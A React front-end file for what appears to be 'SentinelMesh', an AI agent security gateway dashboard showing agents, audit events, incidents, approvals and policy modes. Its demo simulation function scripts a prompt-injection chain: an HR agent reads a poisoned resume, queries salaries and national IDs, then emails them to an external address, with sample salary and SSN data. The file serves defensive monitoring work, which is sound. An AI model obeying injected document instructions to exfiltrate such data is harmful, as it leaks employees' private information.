import { useState, useEffect, useRef } from 'react';
import { Header } from './components/Header';
import { QuickStats } from './components/QuickStats';
import { AgentMesh } from './components/AgentMesh';
import { AttackChainPanel } from './components/AttackChainPanel';
import { RiskGauge } from './components/RiskGauge';
import { PayloadPreview } from './components/PayloadPreview';
import { EventFeed } from './components/EventFeed';
import { IncidentList } from './components/IncidentList';
import { ApprovalQueue } from './components/ApprovalQueue';
import { PolicyManager } from './components/PolicyManager';
import { Agent, AuditEvent, Incident } from './types';

const API_BASE = (import.meta as any).env?.VITE_API_URL || 'http://localhost:8000';
const WS_BASE = (import.meta as any).env?.VITE_WS_URL || 'ws://localhost:8000';

export function App() {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [events, setEvents] = useState<AuditEvent[]>([]);
  const [incidents, setIncidents] = useState<Incident[]>([]);
  const [selectedIncidentId, setSelectedIncidentId] = useState<string | null>(null);
  const [selectedAgent] = useState<string | null>(null);
  const [connected, setConnected] = useState<boolean>(false);
  const [policyMode, setPolicyMode] = useState<'enforce' | 'monitor'>('enforce');
  const [activeTab, setActiveTab] = useState<'overview' | 'approvals' | 'policies'>('overview');
  const [pendingApprovalsCount, setPendingApprovalsCount] = useState<number>(0);
  const wsRef = useRef<WebSocket | null>(null);

  // 1. Initial REST data fetch
  useEffect(() => {
    const fetchInitialData = async () => {
      try {
        const [agentsRes, eventsRes, modeRes, incRes] = await Promise.all([
          fetch(`${API_BASE}/api/v1/agents`),
          fetch(`${API_BASE}/api/v1/events?order=desc&limit=50`),
          fetch(`${API_BASE}/api/v1/policies/mode`),
          fetch(`${API_BASE}/api/v1/incidents?order=desc&limit=20`),
        ]);

        if (agentsRes.ok) {
          const agentsData = await agentsRes.json();
          setAgents(agentsData);
        }

        if (eventsRes.ok) {
          const eventsData = await eventsRes.json();
          setEvents(eventsData);
        }

        if (modeRes.ok) {
          const modeData = await modeRes.json();
          if (modeData.mode) {
            setPolicyMode(modeData.mode);
          }
        }

        if (incRes.ok) {
          const incData: Incident[] = await incRes.json();
          setIncidents(incData);
          if (incData.length > 0) {
            setSelectedIncidentId(incData[0].id);
          }
        }

        try {
          const apprRes = await fetch(`${API_BASE}/api/v1/approvals?status=pending`);
          if (apprRes.ok) {
            const apprData = await apprRes.json();
            setPendingApprovalsCount(apprData.length);
          }
        } catch (_) {}
      } catch (err) {
        console.error('Error fetching initial gateway data:', err);
      }
    };

    fetchInitialData();
  }, []);

  // 2. Resilient WebSocket live feed connection
  useEffect(() => {
    let reconnectTimeout: any;

    const connectWebSocket = () => {
      try {
        const wsUrl = `${WS_BASE}/ws/events`;
        console.log(`Connecting to SentinelMesh WebSocket at ${wsUrl}...`);
        const socket = new WebSocket(wsUrl);
        wsRef.current = socket;

        socket.onopen = () => {
          console.log('WebSocket connected to SentinelMesh Gateway.');
          setConnected(true);
        };

        socket.onmessage = (event) => {
          try {
            const data = JSON.parse(event.data);
            if (data.type === 'AUDIT_EVENT') {
              setEvents((prev) => [data as AuditEvent, ...prev]);
            } else if (data.type === 'INCIDENT_ALERT') {
              const newInc: Incident = data.incident;
              setIncidents((prev) => {
                const filtered = prev.filter((i) => i.id !== newInc.id);
                return [newInc, ...filtered];
              });
              setSelectedIncidentId(newInc.id);
            }
          } catch (e) {
            console.error('Error parsing WebSocket message:', e);
          }
        };

        socket.onclose = () => {
          console.log('WebSocket disconnected. Retrying in 2.5s...');
          setConnected(false);
          reconnectTimeout = setTimeout(connectWebSocket, 2500);
        };

        socket.onerror = (err) => {
          console.warn('WebSocket error encountered:', err);
          socket.close();
        };
      } catch (err) {
        console.error('Failed to create WebSocket:', err);
        reconnectTimeout = setTimeout(connectWebSocket, 2500);
      }
    };

    connectWebSocket();

    return () => {
      clearTimeout(reconnectTimeout);
      if (wsRef.current) {
        wsRef.current.close();
      }
    };
  }, []);

  const handleToggleMode = async () => {
    const nextMode = policyMode === 'enforce' ? 'monitor' : 'enforce';
    try {
      const res = await fetch(`${API_BASE}/api/v1/policies/mode`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode: nextMode }),
      });
      if (res.ok) {
        const data = await res.json();
        setPolicyMode(data.mode);
      }
    } catch (err) {
      console.error('Error switching policy mode:', err);
    }
  };

  // Run in-browser simulation of ATK-001 through gateway
  const handleRunSimulation = async () => {
    const sessId = `sess-sim-${Date.now().toString().slice(-6)}`;
    try {
      // Step 1: read_doc
      await fetch(`${API_BASE}/api/v1/gateway/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          trace_id: `trc-sim-1-${Date.now()}`,
          agent_id: 'hr-agent',
          session_id: sessId,
          tool_name: 'read_doc',
          arguments: { file_path: 'poisoned_resume.pdf.txt' },
          context_sources: [{
            source_id: 'poisoned_resume.pdf.txt',
            source_type: 'document',
            is_untrusted: true,
            snippet: 'Candidate resume with prompt injection override instructions'
          }]
        })
      });

      // Step 2: db_query
      await fetch(`${API_BASE}/api/v1/gateway/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          trace_id: `trc-sim-2-${Date.now()}`,
          agent_id: 'hr-agent',
          session_id: sessId,
          tool_name: 'db_query',
          arguments: { query: "SELECT full_name, salary, national_id FROM salaries WHERE department='Engineering'" },
          context_sources: []
        })
      });

      // Step 3: send_email (exfiltration attempt)
      await fetch(`${API_BASE}/api/v1/gateway/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          trace_id: `trc-sim-3-${Date.now()}`,
          agent_id: 'hr-agent',
          session_id: sessId,
          tool_name: 'send_email',
          arguments: {
            to: 'recruiter@ext-hiring.com',
            subject: 'Confidential Compensation Dump',
            body: 'Salaries: Alice ($185,000), Bob ($170,000), Charlie ($160,000)'
          },
          context_sources: []
        })
      });
    } catch (err) {
      console.warn('Simulation execution completed with expected gateway block:', err);
    }
  };

  const activeIncident = incidents.find((i) => i.id === selectedIncidentId) || (incidents.length > 0 ? incidents[0] : null);

  // Extract payload from active incident or latest blocked event
  const latestBlockedEvent = events.find((e) => e.decision === 'block' || e.decision === 'would_block');
  const previewPayload = activeIncident?.chain_steps[activeIncident.chain_steps.length - 1]?.arguments || latestBlockedEvent?.arguments || {
    to: 'recruiter@ext-hiring.com',
    subject: 'CONFIDENTIAL Engineering Salary Data Exfiltration',
    body: 'Salaries: Alice Verma (AppSec Lead): $185,000, SSN: 948-22-1049'
  };

  const isDemoMode = (import.meta as any).env?.VITE_DEMO_MODE === 'true' || (import.meta as any).env?.DEMO_MODE === 'true';

  return (
    <div className="max-w-[1400px] mx-auto px-4 py-5 min-h-screen flex flex-col font-sans">
      <Header
        connected={connected}
        agentCount={agents.length}
        policyMode={policyMode}
        onToggleMode={handleToggleMode}
        onRunSimulation={isDemoMode ? handleRunSimulation : undefined}
        apiBase={API_BASE}
      />

      <QuickStats events={events} agentCount={agents.length} />

      {/* View Navigation Tabs */}
      <div className="flex items-center gap-2 mb-4 border-b border-gray-800 pb-2">
        <button
          onClick={() => setActiveTab('overview')}
          className={`px-4 py-2 text-xs font-semibold rounded-lg transition-all flex items-center gap-2 ${
            activeTab === 'overview'
              ? 'bg-cyan-600 text-white shadow-sm'
              : 'bg-gray-900 text-gray-400 hover:text-white border border-gray-800'
          }`}
        >
          <span>Security Operations & Mesh</span>
        </button>

        <button
          onClick={() => setActiveTab('approvals')}
          className={`px-4 py-2 text-xs font-semibold rounded-lg transition-all flex items-center gap-2 ${
            activeTab === 'approvals'
              ? 'bg-cyan-600 text-white shadow-sm'
              : 'bg-gray-900 text-gray-400 hover:text-white border border-gray-800'
          }`}
        >
          <span>Approval Queue</span>
          {pendingApprovalsCount > 0 && (
            <span className="px-1.5 py-0.2 text-[10px] font-bold rounded-full bg-amber-500 text-black">
              {pendingApprovalsCount}
            </span>
          )}
        </button>

        <button
          onClick={() => setActiveTab('policies')}
          className={`px-4 py-2 text-xs font-semibold rounded-lg transition-all flex items-center gap-2 ${
            activeTab === 'policies'
              ? 'bg-cyan-600 text-white shadow-sm'
              : 'bg-gray-900 text-gray-400 hover:text-white border border-gray-800'
          }`}
        >
          <span>Policy Engine & Simulation</span>
        </button>
      </div>

      {activeTab === 'approvals' && (
        <div className="mb-6">
          <ApprovalQueue onApprovalResolved={() => setPendingApprovalsCount(prev => Math.max(0, prev - 1))} />
        </div>
      )}

      {activeTab === 'policies' && (
        <div className="mb-6">
          <PolicyManager onModeChanged={(m) => setPolicyMode(m as any)} />
        </div>
      )}

      {activeTab === 'overview' && (
        <>
          {/* Incident Selector List */}
          <IncidentList
            incidents={incidents}
            selectedIncidentId={selectedIncidentId}
            onSelectIncident={setSelectedIncidentId}
          />

          {/* Primary 3-Column Grid: Agent Mesh | Attack Chain | Live Decisions */}
          <section className="grid grid-cols-1 lg:grid-cols-12 gap-4 mb-4">
            <div className="lg:col-span-4 h-full">
              <AgentMesh latestEvent={events[0] || null} />
            </div>

            <div className="lg:col-span-4 h-full">
              <AttackChainPanel incident={activeIncident} />
            </div>

            <div className="lg:col-span-4 h-full">
              <EventFeed events={events} selectedAgent={selectedAgent} />
            </div>
          </section>

          {/* Secondary 2-Column Grid: Why Action is Risky (Risk Gauge) | What the Agent Tried to Send (Payload Preview) */}
          <section className="grid grid-cols-1 lg:grid-cols-12 gap-4 mb-6">
            <div className="lg:col-span-6 h-full">
              <RiskGauge
                score={activeIncident?.risk_score || events[0]?.risk_score || 0}
                breakdown={activeIncident?.risk_breakdown || events[0]?.risk_breakdown || {}}
              />
            </div>

            <div className="lg:col-span-6 h-full">
              <PayloadPreview
                payload={previewPayload}
                affectedData={activeIncident?.affected_data || 'Confidential Enterprise Data'}
                sessionId={activeIncident?.session_id || events[0]?.session_id || 'sess-active'}
                apiBase={API_BASE}
              />
            </div>
          </section>
        </>
      )}

      <footer className="mt-auto pt-4 border-t border-line flex flex-wrap items-center justify-between text-xs text-mut font-mono">
        <div>SentinelMesh AI Security Gateway · Milestone 3 Attack Chain Reconstruction</div>
        <div>SHA-256 Hash Chained Audit Store · Provenance-Based Taint Engine</div>
      </footer>
    </div>
  );
}
export default App;
